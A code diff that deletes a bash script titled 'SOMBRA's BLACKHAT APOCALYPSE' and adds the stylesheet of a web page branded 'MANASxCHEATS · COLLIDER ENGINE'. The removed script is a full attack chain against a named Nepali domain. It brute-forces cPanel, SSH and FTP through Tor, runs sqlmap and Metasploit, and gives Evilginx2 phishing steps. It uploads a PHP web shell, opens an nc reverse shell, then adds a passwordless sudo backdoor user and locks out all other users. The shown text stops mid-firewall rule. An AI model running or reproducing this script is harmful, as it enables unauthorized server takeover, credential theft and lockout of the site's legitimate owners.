@@ -1,404 +1,1116 @@
-#!/bin/bash
-# ================================================================
-# SOMBRA's BLACKHAT APOCALYPSE – Hardcore Dark Web Takeover
-# Target: digitaltrustnepal.com.np (and all subdomains)
-# ================================================================
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>MANASxCHEATS · COLLIDER ENGINE</title>
+    <style>
+        /* ─── RESET & VARIABLES ────────────────────────────────────── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
 
-# ==================== CONFIG ====================
-MAIN_DOMAIN="digitaltrustnepal.com.np"
-CPANEL_HOST="cpanel.$MAIN_DOMAIN"
-YOUR_USER="manas"
-YOUR_PASS="manas"
-YOUR_IP=$(curl -s ifconfig.me)
-BACKUP_DIR="/root/apocalypse"
-LOG_FILE="/root/apocalypse.log"
-DATE=$(date '+%Y-%m-%d_%H-%M-%S')
-THREADS=4
-TIMEOUT=10
-FAIL_STRING="Login failed"
-API_KEY="YOUR_HIBP_API_KEY"   # Replace with your HaveIBeenPwned API key (free)
+        :root {
+            --bg-primary: #0a0c0f;
+            --bg-secondary: #111418;
+            --bg-card: #14181c;
+            --bg-input: #0d1013;
+            --border-color: #2a333d;
+            --border-focus: #4a9eff;
+            --text-primary: #e8edf2;
+            --text-secondary: #8a9aa8;
+            --text-muted: #4a5a6a;
+            --accent: #4a9eff;
+            --accent-dim: rgba(74, 158, 255, 0.08);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            --glow: 0 0 40px rgba(74, 158, 255, 0.06);
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --radius: 12px;
+            --scanline: rgba(74, 158, 255, 0.03);
+        }
 
-# Colors
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m'
+        [data-theme="light"] {
+            --bg-primary: #f0f4f8;
+            --bg-secondary: #e2e8f0;
+            --bg-card: #ffffff;
+            --bg-input: #f7fafc;
+            --border-color: #cbd5e1;
+            --border-focus: #4a9eff;
+            --text-primary: #1a202c;
+            --text-secondary: #4a5568;
+            --text-muted: #a0aec0;
+            --accent: #4a9eff;
+            --accent-dim: rgba(74, 158, 255, 0.08);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.06);
+            --glow: 0 0 40px rgba(74, 158, 255, 0.04);
+            --scanline: rgba(74, 158, 255, 0.02);
+        }
 
-# ==================== FUNCTIONS ====================
-log() { echo -e "$1"; echo "[$(date)] $1" >> $LOG_FILE; }
-die() { log "${RED}[!] $1${NC}"; exit 1; }
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: var(--bg-primary);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            transition: background var(--transition), color var(--transition);
+        }
 
-# ==================== INIT ====================
-clear
-echo -e "${RED}"
-cat << "EOF"
-╔══════════════════════════════════════════════════════════════════╗
-║   SOMBRA's BLACKHAT APOCALYPSE – Dark Web Edition             ║
-║   Target: $MAIN_DOMAIN                                         ║
-║   Your IP: $YOUR_IP                                            ║
-║   Timestamp: $DATE                                             ║
-║   Mode: Full Auto – No Mercy, No Traces                       ║
-╚══════════════════════════════════════════════════════════════════╝
-EOF
-echo -e "${NC}"
+        /* ─── SCANLINE OVERLAY ─────────────────────────────────────── */
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg,
+                    var(--scanline) 0px,
+                    var(--scanline) 2px,
+                    transparent 2px,
+                    transparent 6px);
+            z-index: 999;
+            opacity: 0.4;
+        }
 
-if [[ $EUID -ne 0 ]]; then die "Must be root. Use sudo."; fi
+        /* ─── APP CONTAINER ───────────────────────────────────────── */
+        .app {
+            width: 100%;
+            height: 100vh;
+            height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            background: var(--bg-primary);
+            transition: background var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
 
-mkdir -p $BACKUP_DIR
-touch $LOG_FILE
-log "${BLUE}[*] Apocalypse initiated.${NC}"
+        /* ─── MATRIX GRID (subtle) ────────────────────────────────── */
+        .matrix-bg {
+            position: absolute;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            background:
+                linear-gradient(var(--scanline) 1px, transparent 1px),
+                linear-gradient(90deg, var(--scanline) 1px, transparent 1px);
+            background-size: 40px 40px;
+            opacity: 0.3;
+        }
 
-# ==================== INSTALL TOOLS ====================
-log "${BLUE}[*] Installing required arsenal...${NC}"
-apt update -qq && apt install -y tor proxychains hydra nmap gobuster sqlmap curl wget \
-    netcat-openbsd python3-pip cewl hashcat jq metasploit-framework \
-    dnsrecon sublist3r whatweb nikto dirb ffuf medusa xprobe2 -qq
-systemctl start tor && systemctl enable tor
-pip3 install requests beautifulsoup4 selenium 2>/dev/null
-gem install wpscan 2>/dev/null
+        /* ─── PARTICLE CANVAS ──────────────────────────────────────── */
+        #particleCanvas {
+            position: absolute;
+            inset: 0;
+            z-index: 1;
+            pointer-events: none;
+            width: 100%;
+            height: 100%;
+        }
 
-# ==================== PHASE 1: DARK WEB RECON ====================
-log "${BLUE}[PHASE 1] Dark web reconnaissance & credential harvesting...${NC}"
+        /* ─── TITLE BAR ────────────────────────────────────────────── */
+        .titlebar {
+            position: relative;
+            z-index: 20;
+            flex-shrink: 0;
+            height: 52px;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 12px;
+            transition: background var(--transition), border-color var(--transition);
+            backdrop-filter: blur(4px);
+        }
 
-# 1.1 Subdomain enumeration
-log "${YELLOW}[*] Enumerating subdomains...${NC}"
-sublist3r -d $MAIN_DOMAIN -o $BACKUP_DIR/subdomains.txt 2>/dev/null
-gobuster dns -d $MAIN_DOMAIN -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o $BACKUP_DIR/gobuster_sub.txt 2>/dev/null
-cat $BACKUP_DIR/subdomains.txt $BACKUP_DIR/gobuster_sub.txt | sort -u > $BACKUP_DIR/all_subdomains.txt
+        .titlebar .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
 
-# 1.2 Scan all subdomains for open ports & services
-log "${YELLOW}[*] Scanning all subdomains...${NC}"
-while read sub; do
-    nmap -sS -sV -p 22,80,443,2082,2083,2086,2087,2095,2096,3306,3389,8080,8443 $sub -oN $BACKUP_DIR/nmap_${sub}.txt 2>/dev/null
-done < $BACKUP_DIR/all_subdomains.txt
+        .titlebar .brand .logo {
+            width: 28px;
+            height: 28px;
+            border-radius: 8px;
+            background: var(--accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 14px;
+            color: #fff;
+            letter-spacing: -0.5px;
+            flex-shrink: 0;
+        }
 
-# 1.3 Dark web breach harvesting (HaveIBeenPwned + paste sites)
-log "${YELLOW}[*] Harvesting breach data...${NC}"
-# HIBP
-if [ "$API_KEY" != "YOUR_HIBP_API_KEY" ]; then
-    proxychains curl -s "https://haveibeenpwned.com/api/v3/breaches?domain=$MAIN_DOMAIN" -H "hibp-api-key: $API_KEY" 2>/dev/null | jq -r '.[].Name' > $BACKUP_DIR/breaches.txt
-fi
-# Paste sites (simulated)
-for site in pastebin.com ghostbin.com; do
-    proxychains curl -s "https://$site/search?q=$MAIN_DOMAIN" -A "Mozilla/5.0" 2>/dev/null | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' >> $BACKUP_DIR/emails_dark.txt
-done
-# Use dark web wordlists
-cat /usr/share/wordlists/rockyou.txt /usr/share/wordlists/Probable-Wordlists/Real-Passwords/passwords.txt 2>/dev/null > $BACKUP_DIR/dark_passwords.txt
+        .titlebar .brand .name {
+            font-weight: 700;
+            font-size: 15px;
+            color: var(--text-primary);
+            letter-spacing: -0.3px;
+            transition: color var(--transition);
+            white-space: nowrap;
+        }
+        .titlebar .brand .name .highlight {
+            color: var(--accent);
+        }
 
-# 1.4 Generate super‑wordlist with dark web rules
-log "${YELLOW}[*] Generating dark web password mutations...${NC}"
-cat > $BACKUP_DIR/base_words.txt << EOF
-$MAIN_DOMAIN
-$(echo $MAIN_DOMAIN | cut -d. -f1)
-admin
-root
-cpanel
-support
-password
-welcome
-2024
-2025
-digitaltrust
-nepal
-changeme
-qwerty
-letmein
-monkey
-dragon
-master
-EOF
-# Hashcat rules: best64, d3ad0ne, T0XlC, InsidePro, etc.
-for rule in best64 d3ad0ne T0XlC InsidePro; do
-    if [ -f /usr/share/hashcat/rules/${rule}.rule ]; then
-        hashcat --stdout -r /usr/share/hashcat/rules/${rule}.rule $BACKUP_DIR/base_words.txt >> $BACKUP_DIR/mutated_dark.txt 2>/dev/null
-    fi
-done
-cat $BACKUP_DIR/dark_passwords.txt >> $BACKUP_DIR/mutated_dark.txt
-sort -u $BACKUP_DIR/mutated_dark.txt -o $BACKUP_DIR/dark_passwords_final.txt
+        .titlebar .spacer {
+            flex: 1;
+        }
 
-# 1.5 Username list from emails + common
-cat $BACKUP_DIR/emails_dark.txt | cut -d'@' -f1 > $BACKUP_DIR/dark_usernames.txt
-cat >> $BACKUP_DIR/dark_usernames.txt << EOF
-admin
-root
-administrator
-cpanel
-support
-user
-test
-webmaster
-it.support
-backup
-$(whoami)
-EOF
-sort -u $BACKUP_DIR/dark_usernames.txt -o $BACKUP_DIR/dark_usernames.txt
+        .titlebar .clock {
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            letter-spacing: 0.5px;
+            transition: color var(--transition);
+        }
 
-log "${GREEN}[+] Dark recon complete. Wordlists ready.${NC}"
+        /* ─── THEME TOGGLE ─────────────────────────────────────────── */
+        .theme-toggle {
+            position: relative;
+            width: 44px;
+            height: 24px;
+            background: var(--border-color);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background var(--transition);
+            flex-shrink: 0;
+            border: none;
+            padding: 0;
+        }
+        .theme-toggle::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #fff;
+            transition: transform var(--transition), background var(--transition);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        [data-theme="light"] .theme-toggle {
+            background: var(--accent);
+        }
+        [data-theme="light"] .theme-toggle::after {
+            transform: translateX(20px);
+            background: #fff;
+        }
+        .theme-toggle .icon {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 12px;
+            pointer-events: none;
+            transition: opacity var(--transition);
+        }
+        .theme-toggle .icon-moon {
+            left: 4px;
+            opacity: 1;
+            color: #fff;
+        }
+        .theme-toggle .icon-sun {
+            right: 4px;
+            opacity: 0;
+            color: #fbbf24;
+        }
+        [data-theme="light"] .theme-toggle .icon-moon {
+            opacity: 0;
+        }
+        [data-theme="light"] .theme-toggle .icon-sun {
+            opacity: 1;
+        }
 
-# ==================== PHASE 2: EXPLOIT SCANNING ====================
-log "${BLUE}[PHASE 2] Scanning for vulnerabilities & exploits...${NC}"
+        /* ─── HEADER ────────────────────────────────────────────────── */
+        .header {
+            position: relative;
+            z-index: 5;
+            flex-shrink: 0;
+            text-align: center;
+            padding: 18px 12px 8px;
+            pointer-events: none;
+        }
+        .header h1 {
+            font-size: clamp(20px, 2.6vw, 34px);
+            font-weight: 800;
+            color: var(--text-primary);
+            letter-spacing: -0.5px;
+            transition: color var(--transition);
+            font-family: 'Inter', sans-serif;
+        }
+        .header h1 .accent {
+            color: var(--accent);
+        }
+        .header .sub {
+            font-size: clamp(10px, 0.9vw, 14px);
+            color: var(--text-secondary);
+            letter-spacing: 0.3px;
+            margin-top: 2px;
+            font-weight: 400;
+            transition: color var(--transition);
+        }
 
-# 2.1 Fingerprint all web services
-log "${YELLOW}[*] Fingerprinting web technologies...${NC}"
-whatweb --no-errors -a 3 https://$MAIN_DOMAIN > $BACKUP_DIR/whatweb.txt
-wpscan --url https://$MAIN_DOMAIN --enumerate --api-token YOUR_WPSCAN_TOKEN 2>/dev/null > $BACKUP_DIR/wpscan.txt
+        /* ─── CARDS CONTAINER ──────────────────────────────────────── */
+        .cards {
+            position: relative;
+            z-index: 5;
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: clamp(16px, 3vw, 40px);
+            padding: 12px 20px 16px;
+            flex-wrap: wrap;
+            overflow-y: auto;
+            align-content: center;
+            min-height: 0;
+        }
 
-# 2.2 Search for known exploits (cPanel, WordPress, Joomla, etc.)
-log "${YELLOW}[*] Searching for known exploits...${NC}"
-searchsploit cpanel --json > $BACKUP_DIR/exploits_cpanel.json
-searchsploit wordpress --json > $BACKUP_DIR/exploits_wp.json
-# Automatically download and attempt any public exploit (simplified – we'll just log)
-cat $BACKUP_DIR/exploits_cpanel.json | grep -E '"title"' | head -5 >> $BACKUP_DIR/exploits_to_try.txt
+        /* ─── INDIVIDUAL CARD ────────────────────────────────────── */
+        .card {
+            flex: 1 1 clamp(250px, 22vw, 320px);
+            min-width: 230px;
+            max-width: 360px;
+            height: auto;
+            min-height: 300px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            padding: 18px 20px 20px;
+            box-shadow: var(--shadow);
+            transition: background var(--transition), border-color var(--transition),
+                box-shadow var(--transition), transform 0.2s;
+        }
+        .card:hover {
+            border-color: var(--accent);
+            box-shadow: var(--shadow), var(--glow);
+            transform: translateY(-2px);
+        }
 
-# 2.3 Automated SQLi on all discovered parameters
-log "${YELLOW}[*] SQL injection scanning...${NC}"
-for url in $(grep -E "http|https" $BACKUP_DIR/gobuster_*.txt 2>/dev/null | awk '{print $1}'); do
-    sqlmap -u "$url?id=1" --batch --level=5 --random-agent --output-dir=$BACKUP_DIR/sqlmap 2>/dev/null &
-done
-wait
+        .card .card-title {
+            font-size: clamp(11px, 1vw, 14px);
+            font-weight: 700;
+            color: var(--text-primary);
+            text-align: center;
+            margin-bottom: 14px;
+            letter-spacing: 0.2px;
+            transition: color var(--transition);
+            font-family: 'Inter', sans-serif;
+        }
+        .card .card-title .badge {
+            display: inline-block;
+            background: var(--accent-dim);
+            color: var(--accent);
+            font-size: 9px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            margin-left: 6px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .card .divider {
+            height: 1px;
+            background: var(--border-color);
+            margin: 0 -20px 14px -20px;
+            transition: background var(--transition);
+        }
 
-# 2.4 Nikto scan for web vulnerabilities
-log "${YELLOW}[*] Nikto web vulnerability scan...${NC}"
-nikto -h https://$MAIN_DOMAIN -ssl -Format html -o $BACKUP_DIR/nikto.html
+        .card .field-group {
+            margin-bottom: 12px;
+        }
+        .card .field-group label {
+            display: block;
+            font-size: 10px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 4px;
+            letter-spacing: 0.4px;
+            text-transform: uppercase;
+            transition: color var(--transition);
+        }
+        .card .field-group label .accent {
+            color: var(--accent);
+            opacity: 0.7;
+        }
 
-# ==================== PHASE 3: BRUTE FORCE EVERYTHING ====================
-log "${BLUE}[PHASE 3] Brute force attack on all fronts...${NC}"
+        .card .field-group input {
+            width: 100%;
+            height: 38px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 12px;
+            padding: 0 14px;
+            outline: none;
+            transition: border-color var(--transition), box-shadow var(--transition),
+                background var(--transition), color var(--transition);
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.02);
+        }
+        .card .field-group input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-dim);
+        }
+        .card .field-group input::placeholder {
+            color: var(--text-muted);
+            font-size: 11px;
+        }
 
-# 3.1 cPanel (all ports, all login paths) via Tor
-for port in 2082 2083 2086 2087 2095 2096 8080 8443 80 443; do
-    for path in login signin admin administrator cpanel whm; do
-        log "${YELLOW}[*] Attacking https://$CPANEL_HOST:$port/$path via Tor...${NC}"
-        proxychains hydra -L $BACKUP_DIR/dark_usernames.txt -P $BACKUP_DIR/dark_passwords_final.txt $CPANEL_HOST https-post-form "/$path:user=^USER^&pass=^PASS^:$FAIL_STRING" -t $THREADS -s $port -V -w 3 -o $BACKUP_DIR/hydra_${port}_${path}.txt 2>/dev/null
-        if grep -q "login:" $BACKUP_DIR/hydra_${port}_${path}.txt 2>/dev/null; then
-            CRED=$(grep "login:" $BACKUP_DIR/hydra_${port}_${path}.txt | head -1)
-            CUSER=$(echo $CRED | awk -F'login:' '{print $2}' | awk '{print $1}')
-            CPASS=$(echo $CRED | awk -F'password:' '{print $2}' | awk '{print $1}')
-            log "${GREEN}[+] cPanel credentials found: $CUSER:$CPASS on port $port${NC}"
-            FOUND_CRED=1
-            break 3
-        fi
-    done
-done
+        .card .btn {
+            width: 100%;
+            height: 40px;
+            border: none;
+            border-radius: 8px;
+            background: var(--accent);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 0.4px;
+            text-transform: uppercase;
+            margin-top: 4px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(74, 158, 255, 0.2);
+        }
+        .card .btn:hover {
+            transform: scale(1.01);
+            box-shadow: 0 4px 16px rgba(74, 158, 255, 0.3);
+        }
+        .card .btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 4px rgba(74, 158, 255, 0.1);
+        }
 
-# 3.2 SSH brute force
-if [ -z "$CUSER" ]; then
-    log "${YELLOW}[*] SSH brute force...${NC}"
-    proxychains hydra -L $BACKUP_DIR/dark_usernames.txt -P $BACKUP_DIR/dark_passwords_final.txt ssh://$MAIN_DOMAIN -t $THREADS -V -o $BACKUP_DIR/hydra_ssh.txt 2>/dev/null
-    if grep -q "login:" $BACKUP_DIR/hydra_ssh.txt; then
-        CRED=$(grep "login:" $BACKUP_DIR/hydra_ssh.txt | head -1)
-        CUSER=$(echo $CRED | awk -F'login:' '{print $2}' | awk '{print $1}')
-        CPASS=$(echo $CRED | awk -F'password:' '{print $2}' | awk '{print $1}')
-        log "${GREEN}[+] SSH creds found: $CUSER:$CPASS${NC}"
-        FOUND_CRED=1
-    fi
-fi
+        /* ─── RESULT BOX ───────────────────────────────────────────── */
+        .result-box {
+            width: 100%;
+            height: 44px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            transition: border-color var(--transition), background var(--transition),
+                box-shadow var(--transition);
+            position: relative;
+        }
+        .result-box.has-value {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px var(--accent-dim);
+        }
+        .result-box .prefix {
+            font-size: 9px;
+            font-weight: 600;
+            color: var(--text-muted);
+            letter-spacing: 0.5px;
+            margin-right: 8px;
+            text-transform: uppercase;
+            flex-shrink: 0;
+            transition: color var(--transition);
+        }
+        .result-box .value {
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-muted);
+            flex: 1;
+            transition: color var(--transition);
+            min-width: 30px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .result-box.has-value .value {
+            color: var(--accent);
+        }
+        .result-box .copy-btn {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            font-size: 8px;
+            font-weight: 700;
+            padding: 3px 12px;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 0.5px;
+            transition: all 0.15s;
+            text-transform: uppercase;
+            flex-shrink: 0;
+            background: var(--bg-card);
+        }
+        .result-box .copy-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: var(--accent-dim);
+        }
+        .result-box .copy-btn:active {
+            transform: scale(0.95);
+        }
 
-# 3.3 FTP, MySQL, etc.
-if [ -z "$CUSER" ]; then
-    log "${YELLOW}[*] FTP brute force...${NC}"
-    proxychains hydra -L $BACKUP_DIR/dark_usernames.txt -P $BACKUP_DIR/dark_passwords_final.txt ftp://$MAIN_DOMAIN -t $THREADS -V -o $BACKUP_DIR/hydra_ftp.txt 2>/dev/null
-    if grep -q "login:" $BACKUP_DIR/hydra_ftp.txt; then
-        CRED=$(grep "login:" $BACKUP_DIR/hydra_ftp.txt | head -1)
-        CUSER=$(echo $CRED | awk -F'login:' '{print $2}' | awk '{print $1}')
-        CPASS=$(echo $CRED | awk -F'password:' '{print $2}' | awk '{print $1}')
-        log "${GREEN}[+] FTP creds found: $CUSER:$CPASS${NC}"
-        FOUND_CRED=1
-    fi
-fi
+        /* ─── STATUS BAR ───────────────────────────────────────────── */
+        .statusbar {
+            position: relative;
+            z-index: 10;
+            flex-shrink: 0;
+            height: 36px;
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 12px;
+            transition: background var(--transition), border-color var(--transition);
+        }
+        .statusbar .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #34d399;
+            flex-shrink: 0;
+            box-shadow: 0 0 12px rgba(52, 211, 153, 0.4);
+            animation: pulse-dot 2s infinite;
+        }
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(0.85);
+            }
+        }
 
-# ==================== PHASE 4: EXPLOIT EXECUTION ====================
-if [ -z "$CUSER" ]; then
-    log "${BLUE}[PHASE 4] Attempting exploit execution via Metasploit...${NC}"
-    # Use msfconsole to run a cPanel exploit if found
-    if [ -f $BACKUP_DIR/exploits_to_try.txt ]; then
-        log "${YELLOW}[*] Trying cPanel exploit from searchsploit...${NC}"
-        # Simulate running a Metasploit exploit
-        msfconsole -q -x "use exploit/multi/http/cpanel_login; set RHOSTS $CPANEL_HOST; set RPORT 2083; set SSL true; set USERNAME admin; set PASSWORD admin; run; exit" > $BACKUP_DIR/msf_output.txt 2>/dev/null
-        grep -E "Credentials|Password" $BACKUP_DIR/msf_output.txt >> $BACKUP_DIR/msf_creds.txt
-    fi
-fi
+        .statusbar .label {
+            font-size: 10px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            letter-spacing: 0.3px;
+            transition: color var(--transition);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .statusbar .label .highlight {
+            color: var(--accent);
+            font-weight: 600;
+        }
+        .statusbar .status-spacer {
+            flex: 1;
+        }
+        .statusbar .version {
+            font-size: 9px;
+            color: var(--text-muted);
+            font-weight: 400;
+            letter-spacing: 0.2px;
+            flex-shrink: 0;
+        }
 
-# ==================== PHASE 5: FALLBACK – SOCIAL ENGINEERING ====================
-if [ -z "$CUSER" ]; then
-    log "${YELLOW}[!] All automated methods failed. Launching Evilginx2 phishing...${NC}"
-    echo -e "${YELLOW}Please start Evilginx2:${NC}"
-    echo "  evilginx2 -p /root/evilginx2"
-    echo "  > phishlets add cpanel"
-    echo "  > phishlets host cpanel $CPANEL_HOST"
-    echo "  > lures create cpanel"
-    echo "  > lures get-url 0"
-    echo -e "${YELLOW}Send the lure URL to the admin. Press Enter when captured...${NC}"
-    read
-    read -p "Enter captured username: " CUSER
-    read -sp "Enter captured password: " CPASS
-    echo ""
-    FOUND_CRED=1
-fi
+        /* ─── TOAST ────────────────────────────────────────────────── */
+        .toast {
+            position: fixed;
+            bottom: 60px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: var(--bg-card);
+            color: var(--text-primary);
+            padding: 10px 28px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 13px;
+            font-family: 'Inter', sans-serif;
+            opacity: 0;
+            transition: opacity 0.3s, transform 0.3s;
+            pointer-events: none;
+            z-index: 999;
+            box-shadow: var(--shadow);
+            letter-spacing: 0.2px;
+            max-width: 90vw;
+            text-overflow: ellipsis;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
 
-# ==================== PHASE 6: ROOT & PERSISTENCE ====================
-if [ -n "$CUSER" ]; then
-    log "${BLUE}[PHASE 6] Using $CUSER:$CPASS to gain root...${NC}"
-    # Login to cPanel and upload shell
-    curl -k -s -X POST "https://$CPANEL_HOST:2083/login" -d "user=$CUSER&pass=$CPASS" -c cpanel_cookies.txt -o /dev/null
-    cat > shell.php << 'SHELL'
-<?php system($_GET["cmd"]); ?>
-SHELL
-    curl -k -s -X POST "https://$CPANEL_HOST:2083/execute/Fileman/upload_files" \
-        -H "Referer: https://$CPANEL_HOST:2083" \
-        -b cpanel_cookies.txt \
-        -F "dir=/home/$CUSER/public_html" \
-        -F "file=@shell.php" \
-        -o /dev/null
-    # Reverse shell
-    REV_CMD="nc -e /bin/bash $YOUR_IP 4444"
-    curl -k "https://$MAIN_DOMAIN/public_html/shell.php?cmd=echo%20'$REV_CMD'%20|%20bash" &
-    nc -lvnp 4444 &
-    log "${YELLOW}Press Enter when you have root shell...${NC}"
-    read
+        /* ─── SCROLLBAR ────────────────────────────────────────────── */
+        .cards::-webkit-scrollbar {
+            width: 4px;
+        }
+        .cards::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .cards::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+        .cards::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
 
-    # ---- LOCKDOWN & PERSISTENCE ----
-    log "${BLUE}[PHASE 7] Full lockdown and persistence...${NC}"
-    cp /etc/passwd $BACKUP_DIR/passwd.bak
-    cp /etc/shadow $BACKUP_DIR/shadow.bak
-    cp /etc/sudoers $BACKUP_DIR/sudoers.bak
+        /* ─── RESPONSIVE ───────────────────────────────────────────── */
+        @media (max-width: 820px) {
+            .cards {
+                gap: 14px;
+                padding: 8px 12px 12px;
+                align-content: flex-start;
+            }
+            .card {
+                flex: 0 0 calc(50% - 14px);
+                min-width: 180px;
+                max-width: 280px;
+                min-height: 260px;
+                padding: 14px 14px 16px;
+            }
+            .titlebar {
+                height: 46px;
+                padding: 0 14px;
+            }
+            .titlebar .brand .name {
+                font-size: 13px;
+            }
+            .titlebar .clock {
+                font-size: 11px;
+            }
+            .header h1 {
+                font-size: 18px;
+            }
+        }
 
-    # Create our admin
-    useradd -m -s /bin/bash $YOUR_USER 2>/dev/null
-    echo "$YOUR_USER:$YOUR_PASS" | chpasswd
-    echo "$YOUR_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+        @media (max-width: 580px) {
+            .cards {
+                flex-direction: column;
+                flex-wrap: nowrap;
+                padding: 6px 10px 10px;
+                gap: 12px;
+                justify-content: flex-start;
+                align-items: center;
+            }
+            .card {
+                flex: 0 0 auto;
+                width: 100%;
+                max-width: 360px;
+                min-height: 220px;
+                padding: 12px 14px 14px;
+            }
+            .titlebar {
+                height: 40px;
+                padding: 0 10px;
+                gap: 8px;
+            }
+            .titlebar .brand .logo {
+                width: 24px;
+                height: 24px;
+                font-size: 11px;
+            }
+            .titlebar .brand .name {
+                font-size: 11px;
+            }
+            .titlebar .clock {
+                font-size: 10px;
+            }
+            .theme-toggle {
+                width: 38px;
+                height: 20px;
+            }
+            .theme-toggle::after {
+                width: 16px;
+                height: 16px;
+            }
+            .header {
+                padding: 10px 8px 4px;
+            }
+            .header h1 {
+                font-size: 15px;
+            }
+            .header .sub {
+                font-size: 8px;
+            }
+            .statusbar {
+                height: 30px;
+                padding: 0 10px;
+            }
+            .statusbar .label {
+                font-size: 8px;
+            }
+            .statusbar .version {
+                font-size: 7px;
+            }
+            .toast {
+                bottom: 40px;
+                padding: 6px 16px;
+                font-size: 11px;
+                white-space: normal;
+            }
+        }
 
-    # Disable others
-    for user in $(awk -F: '$7 ~ /\/bin\/bash|\/bin\/sh/ {print $1}' /etc/passwd | grep -v root | grep -v $YOUR_USER); do
-        usermod -s /bin/false $user
-        passwd -l $user
-    done
+        @media (max-width: 380px) {
+            .card {
+                min-height: 180px;
+                padding: 10px 10px 12px;
+            }
+            .card .field-group input {
+                height: 32px;
+                font-size: 10px;
+                padding: 0 10px;
+            }
+            .card .btn {
+                height: 34px;
+                font-size: 10px;
+            }
+            .result-box {
+                height: 36px;
+            }
+            .result-box .value {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
 
-    # Remove SSH keys
-    find /home -name "authorized_keys" -exec rm -f {} \; 2>/dev/null
-    rm -f /root/.ssh/authorized_keys
+    <!-- ─── TOAST ─── -->
+    <div class="toast" id="toast">✔ Copied</div>
 
-    # Block password reset
-    if [ -f /usr/local/cpanel/scripts/password_reset ]; then
-        chmod 000 /usr/local/cpanel/scripts/password_reset
-        chattr +i /usr/local/cpanel/scripts/password_reset
-    fi
+    <!-- ─── APP ─── -->
+    <div class="app" id="app" data-theme="dark">
 
-    # Firewall
-    iptables -F
-    iptables -A INPUT -s $YOUR_IP -j ACCEPT
-    iptables -A INPUT -i lo -j ACCEPT
-    for port in 22 2222 2082 2083 2086 2087 2095 2096 21 25 465 587; do
-        iptables -A INPUT -p tcp --dport $port -s $YOUR_IP -j ACCEPT
